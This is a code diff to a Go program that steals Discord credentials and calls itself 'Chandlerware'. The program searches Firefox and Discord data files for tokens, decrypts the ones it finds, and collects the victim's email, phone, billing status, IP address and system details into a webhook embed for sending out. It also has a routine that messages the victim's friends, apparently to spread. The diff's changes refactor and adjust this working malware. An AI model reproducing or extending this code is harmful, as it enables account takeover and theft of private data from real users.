@@ -5,6 +5,7 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/fs"
 	"io/ioutil"
 	"net/http"
@@ -61,7 +62,7 @@ func spred() {
 		// ["
 		// 	{"id": "162664712394244097",
 		// 	"nickname": null,
-		// 	"user":
+		// 	"u":
 		// 		{"id": "162664712394244097",
 		// 		"username": "ChiliPepperHott",
 		// 		"avatar": "a74dc64a0ddec227d71f4a372e71a5a9",
@@ -81,8 +82,8 @@ func spred() {
 			fmt.Println(err1)
 		}
 
-		for _, user := range Friends {
-			fmt.Println(user)
+		for _, u := range Friends {
+			fmt.Println(u)
 			data := []byte(`{content: "test"}`)
 			req, _ := http.NewRequest("POST", "https://discord.com/api/v9/channels/937809525728247818/messages", bytes.NewBuffer(data))
 
@@ -92,7 +93,7 @@ func spred() {
 			res, err := cl.Do(req)
 			if err != nil {
 				fmt.Print("test")
-				fmt.Println(string(res.StatusCode) + " " + res.Status)
+				fmt.Println(string(rune(res.StatusCode)) + " " + res.Status)
 			}
 			print(res)
 
@@ -113,9 +114,14 @@ func send_info(token string) {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Println(string(response.StatusCode) + " " + response.Status)
+	fmt.Println(string(rune(response.StatusCode)) + " " + response.Status)
 
-	defer response.Body.Close()
+	defer func(Body io.ReadCloser) {
+		err := Body.Close()
+		if err != nil {
+
+		}
+	}(response.Body)
 }
 
 func grabTokenInformation(token string) (jsonEmbed string) {
@@ -153,7 +159,8 @@ func grabTokenInformation(token string) (jsonEmbed string) {
 	discordUser := getJsonValue("username", tokenInformation) + "#" + getJsonValue("discriminator", tokenInformation)
 	discordEmail := getJsonValue("email", tokenInformation)
 	discordPhone := getJsonValue("phone", tokenInformation)
-	discordAvatar := "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200" + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"
+	avatar := "https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200" + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"
+	discordAvatar := "https://cdn.discordapp.com/avatars/" + getJsonValue("id", tokenInformation) + "/" + getJsonValue("avatar", tokenInformation) + ".png"
 
 	var discordNitro string
 	body, err = getRequest("https://discord.com/api/v9/users/@me/billing/subscriptions", true, token)
@@ -168,7 +175,7 @@ func grabTokenInformation(token string) (jsonEmbed string) {
 		}
 	}
 	tokens = append(tokens, "this.is.a.tokens")
-	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + discordAvatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + currentUser.Name + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
+	jsonEmbed = "{\"avatar_url\":\"https://bbk12e1-cdn.myschoolcdn.com/ftpimages/1085/user/large_user6059886_4392615_368.jpg?resize=200,200\",\"embeds\":[{\"thumbnail\":{\"url\":\"" + avatar + "\"},\"color\":3447003,\"footer\":{\"text\":\"" + time.Now().Format("2006.01.02 15:04:05") + "\"},\"author\":{\"name\":\"" + discordUser + "\"},\"fields\":[{\"inline\":true,\"name\":\"Account Info\",\"value\":\"Email: " + discordEmail + "\\nPhone: " + discordPhone + "\\nNitro: " + discordNitro + "\\nBilling Info: " + discordNitro + "\\nAvatar Url: " + discordAvatar + "\"},{\"inline\":true,\"name\":\"PC Info\",\"value\":\"IP: " + ip + "\\nDisplayName: " + displayName + "\\nUsername: " + currentUser.Name + "\\nOS: " + osName + "\\nCPU Arch: " + cpuArch + "\"},{\"name\":\"** Discord Token**\",\"value\":\"```" + token + "```\"},{\"name\":\"**All tokens**\",\"value\":\"```" + strings.Join(tokens, " || ") + "```\"}]}],\"username\":\"" + "Chandlerware" + "\"}"
 	return
 }
 
@@ -199,9 +206,9 @@ func start() {
 			continue
 		}
 		if strings.Contains(location, "Mozilla") {
-			for _, filepath := range get_files(location, ".sqlite") {
+			for _, f := range get_files(location, ".sqlite") {
 				r := regexp.MustCompile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}")
-				file, _ := os.Open(filepath)
+				file, _ := os.Open(f)
 				data, _ := ioutil.ReadAll(file)
 				for _, match := range r.FindAllStringSubmatch(string(data), -1) {
 					tokens = append(tokens, match...)
@@ -210,9 +217,9 @@ func start() {
 			}
 		}
 		if strings.Contains(location, "cord") {
-			for _, filepath := range get_files(location, ".ldb") {
+			for _, f := range get_files(location, ".ldb") {
 				r := regexp.MustCompile("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)")
-				file, _ := os.Open(filepath)
+				file, _ := os.Open(f)
 				data, _ := ioutil.ReadAll(file)
 				for _, match := range r.FindAllString(string(data), -1) {
 					baseToken := strings.SplitAfterN(string(match), "dQw4w9WgXcQ:", 2)[1]
@@ -225,7 +232,6 @@ func start() {
 
 					if !slices.Contains(tokens, string(token)) {
 						tokens = append(tokens, string(token)+"")
-						send_info(token)
 
 					}
 				}
@@ -233,11 +239,12 @@ func start() {
 		}
 
 	}
+	send_info(tokens[0])
 }
 
 func get_files(root, ext string) []string {
 	var a []string
-	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
+	err := filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
 		if e != nil {
 			return e
 		}
@@ -246,6 +253,9 @@ func get_files(root, ext string) []string {
 		}
 		return nil
 	})
+	if err != nil {
+		return nil
+	}
 	return a
 }
 func getJsonValue(key string, jsonData string) (value string) {
